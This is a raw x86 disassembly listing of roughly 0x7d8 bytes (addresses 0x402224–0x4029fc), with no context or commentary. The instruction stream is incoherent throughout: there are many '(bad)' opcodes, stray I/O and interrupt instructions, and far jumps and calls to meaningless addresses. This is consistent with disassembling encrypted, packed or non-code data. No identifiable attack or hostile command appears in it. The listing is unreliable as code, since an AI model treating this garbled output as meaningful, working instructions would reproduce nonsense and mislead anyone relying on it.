  402224:	cmp    eax,0x625de58a
  402229:	out    0xf9,eax
  40222b:	mov    ebx,0xcce8fb86
  402230:	adc    eax,esi
  402232:	outs   dx,DWORD PTR ds:[esi]
  402233:	cmp    eax,esp
  402235:	cmp    al,0x24
  402237:	xchg   DWORD PTR [ebp+ecx*1+0x649bbfd4],edx
  40223e:	mov    ah,0xac
  402240:	dec    esi
  402241:	mov    ah,0x50
  402243:	dec    edx
  402244:	pop    es
  402245:	repz gs call 0x8547:0x3899b426
  40224e:	(bad)  
  40224f:	int    0x89
  402251:	sar    DWORD PTR [edx+0x1499e9a2],0xfb
  402258:	push   ss
  402259:	or     ebp,0x6e28f324
  40225f:	push   ebp
  402260:	mov    dl,0xbc
  402262:	ret    
  402263:	mov    eax,edi
  402265:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402267:	sub    al,dl
  402269:	(bad)  
  40226a:	xchg   esi,eax
  40226b:	sbb    DWORD PTR [edx-0x87589b9],esi
  402271:	pop    edx
  402272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402273:	ins    BYTE PTR es:[edi],dx
  402274:	test   DWORD PTR [edx-0x6a5ec34d],esp
  40227a:	scas   al,BYTE PTR es:[edi]
  40227b:	jge    0x40229a
  40227d:	cmp    al,0xc
  40227f:	pop    esp
  402280:	pop    edi
  402281:	icebp  
  402282:	mov    edx,0x54a00b7
  402287:	push   edx
  402288:	mov    DWORD PTR [edi],edx
  40228a:	jb     0x4022b7
  40228c:	xor    ebp,esp
  40228e:	into   
  40228f:	cbw    
  402291:	ja     0x402239
  402293:	into   
  402294:	pop    edi
  402295:	inc    ecx
  402296:	and    al,0xf0
  402298:	test   eax,0x411019a7
  40229d:	add    DWORD PTR [ebx-0x4e23d8f0],0xfffffffb
  4022a4:	xor    eax,DWORD PTR [esi+0x46]
  4022a7:	inc    esi
  4022a8:	push   ds
  4022a9:	sbb    DWORD PTR [ebx-0x29a0e3e4],ebx
  4022af:	jle    0x402246
  4022b1:	add    eax,0xccf8d80a
  4022b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022b7:	inc    ebp
  4022b8:	dec    BYTE PTR [edx+0x2130d9b8]
  4022be:	pop    ecx
  4022bf:	push   ss
  4022c0:	es popa 
  4022c2:	adc    ebx,eax
  4022c4:	xor    eax,0x9ab64ae4
  4022c9:	push   esi
  4022ca:	adc    dl,BYTE PTR [ebx-0x67]
  4022cd:	cwde   
  4022ce:	je     0x4022f0
  4022d0:	xchg   ecx,eax
  4022d1:	xchg   ebx,eax
  4022d2:	lahf   
  4022d3:	cwde   
  4022d4:	inc    edx
  4022d5:	outs   dx,DWORD PTR ds:[esi]
  4022d6:	mov    eax,ds:0xc679ba55
  4022db:	jge    0x402316
  4022dd:	mov    eax,ds:0xa48decb9
  4022e2:	xchg   DWORD PTR [eax-0x682af226],edi
  4022e8:	daa    
  4022e9:	pop    esi
  4022ea:	cmp    eax,0xc65e6fdd
  4022ef:	xchg   BYTE PTR ss:[ebp-0x6db8cc04],dl
  4022f6:	outs   dx,DWORD PTR ds:[esi]
  4022f7:	pop    ebp
  4022f8:	sub    bl,ch
  4022fa:	add    ebp,DWORD PTR [edx+0x5ecf642d]
  402300:	adc    ebx,DWORD PTR [eax+0x911fdbf]
  402306:	ds mov al,bh
  402309:	push   ss
  40230a:	cmp    DWORD PTR ds:0x550c04aa,edi
  402310:	mov    bh,0x43
  402312:	fdivr  DWORD PTR [edi-0x679494ee]
  402318:	push   ss
  402319:	sbb    eax,0x92597cfe
  40231e:	cmp    eax,0xf9b70f3a
  402323:	iret   
  402324:	pop    ss
  402325:	mov    ecx,0xdb096634
  40232a:	and    eax,0x544cfc6f
  40232f:	test   eax,0x221d79eb
  402334:	popf   
  402335:	aas    
  402336:	sub    DWORD PTR ds:0x22920016,ecx
  40233c:	push   ds
  40233d:	adc    DWORD PTR [edi-0x75],ecx
  402340:	into   
  402341:	shr    DWORD PTR [edi-0x6],cl
  402344:	dec    ebx
  402345:	aas    
  402346:	push   ecx
  402347:	fucom  st(1)
  402349:	mov    dl,0xbe
  40234b:	mov    WORD PTR [ebx],ss
  40234d:	inc    edi
  40234e:	mov    ds:0xb04bb5d6,al
  402353:	test   DWORD PTR [edi+ebp*1],ebp
  402356:	inc    edx
  402357:	rcr    DWORD PTR [edi+0x2304d146],1
  40235d:	and    BYTE PTR [eax],ah
  40235f:	xchg   ebx,eax
  402360:	popf   
  402361:	xor    ecx,ebx
  402363:	lods   al,BYTE PTR ds:[esi]
  402364:	add    al,0x5e
  402366:	enter  0x142c,0x45
  40236a:	loope  0x40234b
  40236c:	leave  
  40236d:	pusha  
  40236e:	pop    es
  40236f:	jp     0x402324
  402371:	xor    al,0x89
  402373:	jbe    0x402321
  402375:	mov    al,ds:0x8528fd4d
  40237a:	or     DWORD PTR [edx],esp
  40237c:	cmp    BYTE PTR [ecx+0x52],bl
  40237f:	in     al,dx
  402380:	inc    eax
  402381:	jmp    0x4023ac
  402383:	in     eax,0x44
  402385:	dec    ebp
  402386:	push   esp
  402387:	jmp    0x40235b
  402389:	or     cl,al
  40238b:	sub    cl,BYTE PTR [ecx-0x22]
  40238e:	push   0xfffffff2
  402390:	push   ss
  402391:	sbb    ebp,ecx
  402393:	and    DWORD PTR [edi-0x7840bee1],esi
  402399:	mov    cl,0x53
  40239b:	fisubr WORD PTR [esi+0x68]
  40239e:	sti    
  40239f:	add    al,BYTE PTR [esp+ebx*1+0x29bfbb66]
  4023a6:	or     DWORD PTR [esi],0x98b11770
  4023ac:	popf   
  4023ad:	cmp    eax,ecx
  4023af:	lea    eax,[edi+0x68]
  4023b2:	mov    al,0x24
  4023b4:	adc    ecx,DWORD PTR [esi+esi*8+0x737b5da0]
  4023bb:	mov    cl,0xef
  4023bd:	or     eax,0xe0a441f7
  4023c2:	mov    DWORD PTR [ecx],eax
  4023c4:	push   ebp
  4023c5:	cmp    al,0xfa
  4023c7:	or     eax,0x2b9200d3
  4023cc:	jbe    0x402429
  4023ce:	loopne 0x4023e9
  4023d0:	add    BYTE PTR [eax-0x7f4920e8],ch
  4023d6:	dec    ebp
  4023d7:	popa   
  4023d8:	mov    ebx,0x15d35dfe
  4023dd:	jle    0x402455
  4023df:	sub    ecx,esi
  4023e1:	jb     0x402407
  4023e3:	xor    BYTE PTR [edi+0x4c],ch
  4023e6:	xchg   edi,eax
  4023e7:	into   
  4023e8:	std    
  4023e9:	jae    0x4023ae
  4023eb:	adc    al,0x1f
  4023ed:	mov    al,ds:0x3471fa2a
  4023f2:	xchg   ebp,eax
  4023f3:	dec    ebp
  4023f4:	imul   esp,DWORD PTR [ebp+edi*4-0xd],0xa07fe615
  4023fc:	imul   ebx,DWORD PTR [ecx+0x7c],0x39
  402400:	leave  
  402401:	push   edi
  402402:	add    DWORD PTR [edi-0x24],edx
  402405:	(bad)  
  402406:	pop    edx
  402407:	sbb    eax,0x6a2f2587
  40240c:	inc    ebx
  40240d:	add    BYTE PTR [eax+eiz*2],bl
  402410:	not    DWORD PTR [ebp+ebx*8+0x63]
  402414:	xchg   ecx,eax
  402415:	sub    bl,BYTE PTR [esi-0x41ce6a54]
  40241b:	(bad)  
  40241c:	out    dx,eax
  40241d:	lods   al,BYTE PTR ds:[esi]
  40241e:	mov    esi,0x51be8fb5
  402423:	(bad)  
  402424:	jecxz  0x40249f
  402426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402427:	or     dl,BYTE PTR [edx-0x19126839]
  40242d:	mov    eax,ds:0x9f0a07d2
  402432:	sub    esi,ebx
  402434:	jge    0x402411
  402436:	xor    DWORD PTR [edi-0x38],ecx
  402439:	inc    ebx
  40243a:	mov    bl,0x18
  40243c:	or     DWORD PTR [edi+0x44],ebp
  40243f:	inc    edi
  402440:	aam    0x8c
  402442:	jge    0x40248a
  402444:	rol    BYTE PTR [ecx-0x32e80836],0x3b
  40244b:	aaa    
  40244c:	(bad)  
  40244d:	xor    bh,BYTE PTR [ebx]
  40244f:	xor    edx,DWORD PTR [eax+0x43]
  402452:	enter  0x9c6,0x39
  402456:	xchg   edi,eax
  402457:	adc    DWORD PTR [edi+edi*8-0x1963a22],esp
  40245e:	jnp    0x4024ba
  402460:	pop    edi
  402461:	dec    esi
  402462:	fist   WORD PTR [ecx-0x3269e40]
  402468:	dec    edx
  402469:	pusha  
  40246a:	pushaw 
  40246c:	lock out 0x32,eax
  40246f:	popa   
  402470:	cli    
  402471:	sub    esp,DWORD PTR [ecx+0x70]
  402474:	push   eax
  402475:	pop    ebx
  402476:	sbb    eax,0x37d89996
  40247b:	outs   dx,BYTE PTR ds:[esi]
  40247c:	add    DWORD PTR [ebp+0x21b09b0d],ecx
  402482:	and    esi,DWORD PTR [edi+0x10daba6]
  402488:	aaa    
  402489:	pop    esp
  40248a:	xchg   ebx,eax
  40248b:	pop    es
  40248c:	and    DWORD PTR [ebx-0x5b2c68c7],0x7b5f63a6
  402496:	cmp    eax,0x3ff85e7a
  40249b:	lock xchg esp,eax
  40249e:	loopne 0x402479
  4024a0:	test   al,bl
  4024a2:	or     ch,BYTE PTR gs:[ecx+esi*4+0x48]
  4024a7:	xor    al,0x53
  4024a9:	sar    DWORD PTR [ecx+0x5835d1e8],cl
  4024af:	loope  0x402476
  4024b1:	xor    bl,BYTE PTR [esi+0x2265e5a8]
  4024b7:	in     al,0x73
  4024b9:	mov    esp,0x2d9215ef
  4024be:	fild   QWORD PTR [ebp+0x2e]
  4024c1:	inc    ecx
  4024c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c3:	push   cs
  4024c4:	std    
  4024c5:	(bad)  
  4024c7:	or     BYTE PTR [ebx],dl
  4024c9:	(bad)  
  4024ca:	push   esi
  4024cb:	call   0x28ce8a8c
  4024d0:	fistp  DWORD PTR [eax+0x46]
  4024d3:	inc    eax
  4024d4:	inc    esp
  4024d5:	sbb    al,0x2d
  4024d7:	adc    eax,eax
  4024d9:	add    ch,bh
  4024db:	push   edx
  4024dc:	mov    esi,0x388259e7
  4024e1:	mov    dh,0xb4
  4024e3:	and    bh,dh
  4024e5:	enter  0x7ffa,0xd7
  4024e9:	fnstsw ax
  4024eb:	scas   eax,DWORD PTR es:[edi]
  4024ec:	dec    ebx
  4024ed:	adc    esi,eax
  4024ef:	outs   dx,DWORD PTR ds:[esi]
  4024f0:	xchg   edx,eax
  4024f1:	mov    ds:0x6118562d,al
  4024f6:	icebp  
  4024f7:	bound  edx,QWORD PTR [ebx+0x5c048831]
  4024fd:	cmp    bh,BYTE PTR [esi-0x23]
  402500:	loope  0x402490
  402502:	lea    ebx,[eax]
  402504:	loope  0x4024ca
  402506:	mov    ah,0xb7
  402508:	mov    dl,0x72
  40250a:	mov    ecx,0xd39dbc27
  40250f:	pavgw  mm3,QWORD PTR [ecx+0xa917a93]
  402516:	add    ecx,ebp
  402518:	jmp    0xe02:0xf343ac89
  40251f:	daa    
  402520:	push   esp
  402521:	fld    DWORD PTR [ebx]
  402523:	imul   ecx,DWORD PTR [esi],0xebe03a56
  402529:	retf   0x31d7
  40252c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40252d:	adc    dh,cl
  40252f:	pushf  
  402530:	stos   DWORD PTR es:[edi],eax
  402531:	xchg   ecx,eax
  402532:	push   esi
  402533:	rol    BYTE PTR ds:0x51e84294,0x39
  40253a:	sbb    BYTE PTR [edi-0x3e],0xdc
  40253e:	into   
  40253f:	aas    
  402540:	mov    esi,0xf7cd59d9
  402545:	jbe    0x40257d
  402547:	push   ss
  402548:	mov    ch,ah
  40254a:	mov    ebp,0xe9340687
  40254f:	mov    edx,0x82a95ec9
  402554:	ja     0x4025c5
  402556:	adc    ebx,esi
  402558:	inc    ebx
  402559:	imul   esp,esp,0x2b
  40255c:	int3   
  40255d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40255e:	inc    esp
  40255f:	xchg   edx,eax
  402560:	dec    edi
  402561:	inc    edi
  402562:	sahf   
  402563:	jns    0x40252d
  402565:	push   edx
  402566:	push   ecx
  402567:	xchg   DWORD PTR [ebp-0x6b],ebp
  40256a:	push   ss
  40256b:	or     BYTE PTR ds:0xed313e5,bl
  402571:	sub    al,0x27
  402573:	ret    0x6bfd
  402576:	xchg   ebp,eax
  402577:	sub    DWORD PTR [edx+0x7],eax
  40257a:	or     eax,0x49fe4b0a
  40257f:	inc    ebp
  402580:	(bad)  
  402581:	ficomp DWORD PTR [esi-0x5f]
  402584:	sbb    DWORD PTR [ebx+0x437c517d],edi
  40258a:	mov    BYTE PTR [ecx+0x6e],ah
  40258d:	fld    QWORD PTR [edi+0x26]
  402590:	nop
  402591:	add    eax,ebx
  402593:	xlat   BYTE PTR ds:[ebx]
  402594:	ror    DWORD PTR [eax+0x60dd542c],cl
  40259a:	mov    BYTE PTR [edi+0x22],cl
  40259d:	fs add eax,0x7cd21304
  4025a3:	rol    BYTE PTR [ecx-0x3f927fed],0x90
  4025aa:	pushf  
  4025ab:	push   0x13
  4025ad:	jl     0x402555
  4025af:	(bad)  
  4025b1:	push   edi
  4025b2:	pop    edi
  4025b3:	pop    ss
  4025b4:	cmp    eax,0x2071a2cb
  4025b9:	jle    0x4025cc
  4025bb:	push   ecx
  4025bc:	int3   
  4025bd:	les    esi,FWORD PTR [ebp-0x54]
  4025c0:	xor    eax,0xf5afe1ae
  4025c5:	ss push ebp
  4025c7:	pop    ds
  4025c8:	fisttp QWORD PTR fs:[ebx+0x4f2512ac]
  4025cf:	out    0x83,eax
  4025d1:	stos   BYTE PTR es:[edi],al
  4025d2:	imul   edi,DWORD PTR [ecx-0x37],0x6a0d202
  4025d9:	aam    0x18
  4025db:	into   
  4025dc:	mov    cl,0xa3
  4025de:	lods   al,BYTE PTR ds:[esi]
  4025df:	sub    BYTE PTR ds:0xbccda0d5,0x61
  4025e6:	jmp    0xfd3fc5ee
  4025eb:	call   0x856:0xbc15ae3f
  4025f2:	inc    esp
  4025f3:	and    dh,BYTE PTR [edi]
  4025f5:	inc    ecx
  4025f6:	lods   al,BYTE PTR ds:[esi]
  4025f7:	dec    ecx
  4025f9:	sub    al,0xe6
  4025fb:	cmp    ch,BYTE PTR [edx+0x3c9eb78b]
  402601:	add    BYTE PTR [edi],0x3b
  402604:	cmp    eax,0x72aeab8
  402609:	add    ch,BYTE PTR ds:0x7f8c1390
  40260f:	jg     0x40268c
  402611:	sbb    eax,0xf6b1a63
  402616:	inc    esi
  402617:	pop    eax
  402618:	and    eax,0x87d4c317
  40261d:	retf   
  40261e:	or     esp,DWORD PTR [ecx]
  402620:	test   al,0xe5
  402622:	add    eax,0xef8b7464
  402627:	jg     0x40261e
  402629:	xchg   ecx,eax
  40262a:	pop    ds
  40262b:	pop    edx
  40262c:	mov    ?,WORD PTR [edx-0x3f]
  40262f:	xor    al,0xb2
  402631:	popf   
  402632:	cmp    dl,BYTE PTR [eax]
  402634:	add    DWORD PTR [edx-0x57],0x7894f375
  40263b:	mov    edi,0x48178f69
  402640:	mov    esi,0x5f98c5b7
  402645:	sub    eax,0xd6d9fcd8
  40264a:	mov    ecx,0x2ed0b46e
  40264f:	xchg   BYTE PTR [ecx-0x470946bf],ch
  402655:	loop   0x4025f3
  402657:	ficomp DWORD PTR [ecx-0xf]
  40265a:	cmp    al,0xe
  40265c:	clc    
  40265d:	inc    ebx
  40265e:	xor    al,0x4c
  402660:	dec    ebp
  402661:	jb     0x4025fc
  402663:	lock sub eax,0x76d89965
  402669:	xchg   DWORD PTR [ebp+0x24326fbb],ebx
  40266f:	mov    bh,0x15
  402671:	sbb    BYTE PTR [edx+0x3e250651],dl
  402677:	scas   eax,DWORD PTR es:[edi]
  402678:	dec    ebx
  402679:	pop    ss
  40267a:	ja     0x402616
  40267c:	js     0x4026cc
  40267e:	imul   edi,DWORD PTR ds:0x2c0d3ce9,0xffffffc3
  402685:	shl    DWORD PTR [edi],cl
  402687:	sub    cl,BYTE PTR [edx-0x3642019c]
  40268d:	sub    DWORD PTR [eax-0x29],ecx
  402690:	dec    eax
  402691:	retf   
  402692:	jecxz  0x4026fd
  402694:	add    eax,0x4e29e4d0
  402699:	xor    eax,0x56607891
  40269e:	test   DWORD PTR [ecx-0x6edc2ad6],0x479817c7
  4026a8:	or     eax,DWORD PTR [edi+0x6]
  4026ab:	jne    0x402662
  4026ad:	pop    ebp
  4026ae:	xor    al,0xb6
  4026b0:	mov    ah,0x2b
  4026b3:	pusha  
  4026b4:	cmc    
  4026b5:	ficom  WORD PTR [ebp-0x276f3cb4]
  4026bb:	inc    ebx
  4026bd:	pop    esi
  4026be:	xor    ch,BYTE PTR [edx+0x6b]
  4026c1:	adc    DWORD PTR [eax],ebp
  4026c3:	dec    eax
  4026c4:	fmul   QWORD PTR [edx]
  4026c6:	inc    ebp
  4026c7:	int    0x6d
  4026c9:	(bad)  
  4026ca:	sub    bl,BYTE PTR [ecx+0x1c]
  4026cd:	fisub  DWORD PTR [esi]
  4026cf:	repnz push 0x57
  4026d2:	dec    eax
  4026d3:	inc    eax
  4026d4:	int3   
  4026d5:	and    esp,DWORD PTR [ebx-0x61]
  4026d8:	push   ebx
  4026d9:	idiv   BYTE PTR [ecx]
  4026db:	retf   
  4026dc:	inc    eax
  4026dd:	scas   eax,DWORD PTR es:[edi]
  4026de:	push   edx
  4026df:	repnz xor BYTE PTR [ecx+0x2bfa7837],0xd0
  4026e7:	icebp  
  4026e8:	push   edi
  4026e9:	jb     0x402724
  4026eb:	ins    DWORD PTR es:[edi],dx
  4026ec:	add    eax,0xeca3880b
  4026f1:	sbb    ah,BYTE PTR fs:[edi]
  4026f4:	cmp    eax,0xacef3fc0
  4026f9:	mov    eax,ds:0xbabde7d
  4026fe:	jno    0x40271d
  402700:	push   esp
  402701:	inc    ebp
  402702:	xor    al,0xd
  402704:	addr16 mov bl,0x16
  402707:	test   BYTE PTR [edi+0x76],ah
  40270a:	aad    0xd0
  40270c:	arpl   WORD PTR [eax+0x2acdf805],sp
  402712:	fcom   DWORD PTR [edi]
  402714:	test   al,0x2
  402716:	imul   esp,DWORD PTR [edx+0x3e],0x65
  40271a:	sub    eax,0x5a097801
  40271f:	repnz xchg ebx,eax
  402721:	out    0xc3,al
  402723:	scas   eax,DWORD PTR es:[edi]
  402724:	pop    esi
  402725:	mov    esi,0x47019c61
  40272a:	pop    edi
  40272b:	push   ds
  40272c:	clc    
  40272d:	xchg   edx,eax
  40272e:	push   ds
  40272f:	dec    DWORD PTR [eax-0x5919f328]
  402735:	mov    al,0xe2
  402737:	xchg   edx,eax
  402738:	(bad)  [ebx]
  40273a:	imul   BYTE PTR [edx+esi*4]
  40273d:	jnp    0x402745
  40273f:	inc    eax
  402740:	push   ebp
  402741:	lock sub al,0x91
  402744:	push   edi
  402745:	pop    esp
  402746:	(bad)  
  402748:	jae    0x402746
  40274a:	and    DWORD PTR [eax+0x6a],edi
  40274d:	mov    esp,0xdabbff6e
  402752:	popa   
  402753:	mov    al,0x59
  402755:	jmp    0x2e36f95a
  40275a:	jecxz  0x402765
  40275c:	shl    DWORD PTR [edx],0x6e
  40275f:	mov    al,0x1e
  402761:	lods   eax,DWORD PTR ds:[esi]
  402762:	outs   dx,BYTE PTR ds:[esi]
  402763:	stos   BYTE PTR es:[edi],al
  402764:	ins    DWORD PTR es:[edi],dx
  402765:	lahf   
  402766:	and    esi,DWORD PTR [ecx]
  402768:	mov    ebx,0x6eec59e
  40276d:	cwde   
  40276e:	sbb    eax,0x1963638a
  402773:	xor    ecx,DWORD PTR [ebp-0x48]
  402776:	adc    eax,0xcf0bb5c3
  40277b:	loope  0x4027ad
  40277d:	clc    
  40277e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40277f:	push   esp
  402780:	in     eax,dx
  402781:	fisub  DWORD PTR [edx]
  402783:	test   BYTE PTR [edx],0x4f
  402786:	enter  0x8a55,0xb2
  40278a:	jmp    0x8920:0xe201ce2f
  402791:	(bad)  
  402792:	mov    ds:0x555fc2a1,al
  402797:	jmp    0xc088:0xde7e8d8a
  40279e:	cmp    al,0x58
  4027a0:	sub    al,0x48
  4027a2:	sbb    al,0x36
  4027a4:	icebp  
  4027a5:	in     al,0x6b
  4027a7:	jecxz  0x4027f3
  4027a9:	mov    edi,0x6936b06a
  4027ae:	or     DWORD PTR [ecx+0xe],eax
  4027b1:	loop   0x4027c1
  4027b3:	fsubr  DWORD PTR [edi]
  4027b5:	inc    ebx
  4027b6:	mov    cl,0x28
  4027b8:	xchg   BYTE PTR [edx+0x5ffe5119],bh
  4027be:	pop    esi
  4027bf:	test   eax,0xb0ec5d2e
  4027c4:	mov    edi,ds
  4027c6:	js     0x4027fb
  4027c8:	pusha  
  4027c9:	pushf  
  4027ca:	repnz ds cld 
  4027cd:	popf   
  4027ce:	fist   DWORD PTR [edi+0x15]
  4027d1:	adc    DWORD PTR [eax+0x5e],esi
  4027d4:	mov    ecx,0x82f5f459
  4027d9:	lock ds push edi
  4027dc:	sub    al,0xc7
  4027de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027df:	push   esp
  4027e0:	jmp    0x28c2fcde
  4027e5:	popf   
  4027e6:	push   esp
  4027e7:	rcr    DWORD PTR [ebx],cl
  4027e9:	mov    al,0x38
  4027eb:	push   edx
  4027ec:	js     0x4027af
  4027ee:	and    ebx,DWORD PTR [eax+0x19cb8787]
  4027f4:	addr16 pop edx
  4027f6:	xor    edx,ebx
  4027f8:	adc    dl,BYTE PTR [ebx-0x198027a8]
  4027fe:	and    esi,DWORD PTR [esi+0x4fa64516]
  402804:	xor    al,0x44
  402806:	(bad)  
  402807:	mov    bl,0x56
  402809:	cwde   
  40280a:	xchg   ecx,eax
  40280b:	push   eax
  40280c:	outs   dx,DWORD PTR ds:[esi]
  40280d:	add    BYTE PTR [ebp+0x21d16004],bh
  402813:	scas   eax,DWORD PTR es:[edi]
  402814:	mov    ah,0x93
  402816:	fwait
  402817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402818:	das    
  402819:	mov    dh,0x10
  40281b:	cdq    
  40281c:	or     BYTE PTR [ebx+0x179a5933],dh
  402822:	pop    edi
  402823:	leave  
  402824:	iret   
  402825:	adc    eax,0x398f49d0
  40282a:	in     al,dx
  40282b:	mov    DWORD PTR [edi],edx
  40282d:	(bad)  
  40282e:	jle    0x40281f
  402830:	mov    ch,BYTE PTR [edi+0x78]
  402833:	aas    
  402834:	mov    esi,0x2ad7d452
  40283a:	push   esi
  40283b:	ret    
  40283c:	xor    edx,DWORD PTR [ebx]
  40283e:	xchg   edi,eax
  40283f:	cdq    
  402840:	dec    edi
  402841:	xchg   ecx,eax
  402842:	stos   DWORD PTR es:[edi],eax
  402843:	and    al,0xd4
  402845:	mov    dl,0xa5
  402847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402849:	mov    eax,ds:0xd67d2128
  40284e:	out    0x8d,al
  402850:	xchg   edi,eax
  402851:	jecxz  0x4027dd
  402853:	cmp    al,0x5
  402855:	repz or BYTE PTR ds:0x74e34982,bl
  40285c:	jp     0x4027fd
  40285e:	mov    dh,0xcc
  402860:	add    eax,0x49ddc600
  402865:	mov    eax,0x83f1f8ec
  40286a:	jo     0x4027ee
  40286c:	pop    si
  40286e:	ret    0xd128
  402871:	loopne 0x402891
  402873:	adc    ebx,esp
  402875:	pop    ebx
  402876:	add    ah,BYTE PTR ds:0xf8f59a3d
  40287c:	cli    
  40287d:	jmp    0x402879
  40287f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402880:	xchg   esi,eax
  402881:	sbb    BYTE PTR gs:[eax],dh
  402884:	xor    DWORD PTR [ebp-0x56],edx
  402887:	inc    eax
  402888:	sbb    eax,0x2abe5290
  40288d:	call   0x699d7ed
  402892:	mov    ch,BYTE PTR [ecx-0x9]
  402895:	aad    0x7e
  402897:	inc    edi
  402898:	mov    esp,0x7f283d89
  40289d:	inc    ecx
  40289e:	jmp    0x402890
  4028a0:	xchg   ebx,eax
  4028a1:	jle    0x4028d7
  4028a3:	icebp  
  4028a4:	mov    dh,0xd1
  4028a6:	mov    ebx,0x945e634
  4028ab:	jae    0x402919
  4028ad:	ds dec ecx
  4028af:	scas   al,BYTE PTR es:[edi]
  4028b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028b1:	imul   ecx,DWORD PTR [edi+0x38],0x7c
  4028b5:	out    0x4c,al
  4028b7:	int3   
  4028b8:	and    BYTE PTR [esi],0x58
  4028bb:	aas    
  4028bc:	jge    0x4028da
  4028be:	stos   BYTE PTR es:[edi],al
  4028bf:	(bad)  
  4028c0:	xor    cl,bl
  4028c2:	call   0xd9ac:0x6d15b34b
  4028c9:	inc    ebx
  4028ca:	je     0x40293c
  4028cc:	jecxz  0x4028bc
  4028ce:	xchg   esp,eax
  4028cf:	test   BYTE PTR [eax+0x4a98af49],al
  4028d5:	pushf  
  4028d6:	lea    esp,[ebx-0x77983bca]
  4028dc:	aaa    
  4028dd:	push   cs
  4028de:	fnstsw WORD PTR [ebx+0x6f53dde0]
  4028e4:	add    eax,0x5711c95c
  4028e9:	aad    0xc1
  4028eb:	or     bh,BYTE PTR [ecx+ecx*4+0x66]
  4028ef:	or     eax,0xef5ce245
  4028f4:	mov    ch,0xba
  4028f6:	(bad)  
  4028f7:	ret    0xd647
  4028fa:	pop    ecx
  4028fb:	xchg   edi,eax
  4028fc:	or     al,dh
  4028fe:	mov    esp,0x83734dc3
  402903:	sbb    al,0xeb
  402905:	dec    ecx
  402906:	push   esp
  402907:	inc    edx
  402908:	pusha  
  402909:	adc    ebx,DWORD PTR [edi+edi*8-0x38]
  40290d:	sub    DWORD PTR [esi-0x183e5dd1],eax
  402913:	addr16 push edx
  402915:	or     al,0x80
  402917:	or     eax,0xca5acb40
  40291c:	ds js  0x40299a
  40291f:	or     DWORD PTR [eax],edi
  402921:	or     al,0x15
  402923:	pusha  
  402924:	xor    eax,0x89f35f86
  402929:	cmp    bh,BYTE PTR [edx]
  40292b:	outs   dx,DWORD PTR ds:[esi]
  40292c:	inc    ebx
  40292d:	fcom   DWORD PTR [eax+0x6e]
  402930:	bound  edx,QWORD PTR [edi+0x4a]
  402933:	sbb    ah,BYTE PTR [esi]
  402935:	and    DWORD PTR [edx-0x3b],esp
  402938:	cdq    
  402939:	jl     0x40296e
  40293b:	(bad)  
  40293c:	add    al,0xf2
  40293e:	dec    edi
  40293f:	cmp    al,al
  402941:	mov    ds:0x470d21c6,al
  402946:	int3   
  402947:	dec    ecx
  402948:	in     al,0xb4
  40294a:	call   0x7d0223a7
  40294f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402950:	fst    QWORD PTR ds:0x5bc265a6
  402956:	push   edx
  402957:	dec    ecx
  402958:	jecxz  0x40295a
  40295a:	xchg   ebx,eax
  40295b:	je     0x4029ce
  40295d:	mov    al,0xb9
  40295f:	xchg   ebx,eax
  402960:	ffreep st(1)
  402962:	jne    0x40297a
  402964:	push   ecx
  402965:	lods   al,BYTE PTR ds:[esi]
  402966:	xlat   BYTE PTR ds:[ebx]
  402967:	cmp    ebp,DWORD PTR [ebx+0x34e6dfd7]
  40296d:	ins    BYTE PTR es:[edi],dx
  40296e:	ins    DWORD PTR es:[edi],dx
  40296f:	xor    bh,ch
  402971:	shl    DWORD PTR [edi],0x74
  402974:	or     al,ah
  402976:	dec    ebx
  402977:	xchg   esp,eax
  402978:	sbb    al,0x5e
  40297a:	dec    ebp
  40297b:	hlt    
  40297c:	je     0x4029f5
  40297e:	add    al,0x98
  402980:	stos   DWORD PTR es:[edi],eax
  402981:	dec    ebx
  402982:	jns    0x4029b4
  402984:	xor    eax,0xbe5d1a44
  402989:	ss clc 
  40298b:	adc    eax,0x83a8b330
  402990:	mov    BYTE PTR [edi+eiz*8+0x44],al
  402994:	push   ebp
  402995:	jmp    0x402940
  402997:	pop    esp
  402998:	xor    ah,BYTE PTR [ecx+ecx*4]
  40299b:	cwde   
  40299c:	sub    dh,BYTE PTR ds:0xd9d2116a
  4029a2:	adc    DWORD PTR [ebx-0x5bb9e4f5],0x45
  4029a9:	nop
  4029aa:	sti    
  4029ab:	jb     0x40298c
  4029ad:	mov    ds:0x3e70a212,eax
  4029b2:	test   eax,0x3b004e50
  4029b7:	jbe    0x402979
  4029b9:	sub    eax,0x108f6b59
  4029be:	stc    
  4029bf:	mov    edx,ebp
  4029c1:	xchg   edx,eax
  4029c2:	sub    dl,BYTE PTR [edi+edi*4+0x7a]
  4029c6:	jae    0x4029f8
  4029c8:	pop    edx
  4029c9:	xor    ebx,DWORD PTR [eax-0x80]
  4029cc:	sbb    al,BYTE PTR [eax-0x79]
  4029cf:	or     eax,0xa48d82f4
  4029d4:	xor    DWORD PTR [ebx-0x72],ecx
  4029d7:	dec    eax
  4029d8:	ja     0x402996
  4029da:	lods   eax,DWORD PTR ds:[esi]
  4029db:	scas   al,BYTE PTR es:[edi]
  4029dc:	into   
  4029dd:	jmp    0x402a57
  4029df:	ss mov dl,0x92
  4029e2:	mov    edx,eax
  4029e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029e5:	inc    eax
  4029e6:	and    ch,BYTE PTR [edx+0x4291fbdf]
  4029ec:	push   ebx
  4029ed:	lods   eax,DWORD PTR ds:[esi]
  4029ee:	cwde   
  4029ef:	mov    ecx,0x55caad27
  4029f4:	sub    esp,DWORD PTR [ecx]
  4029f6:	xlat   BYTE PTR ds:[ebx]
  4029f7:	aad    0xda
  4029f9:	popf   
  4029fa:	sti    
  4029fb:	push   edi
  4029fc:	xchg   edx,ebx
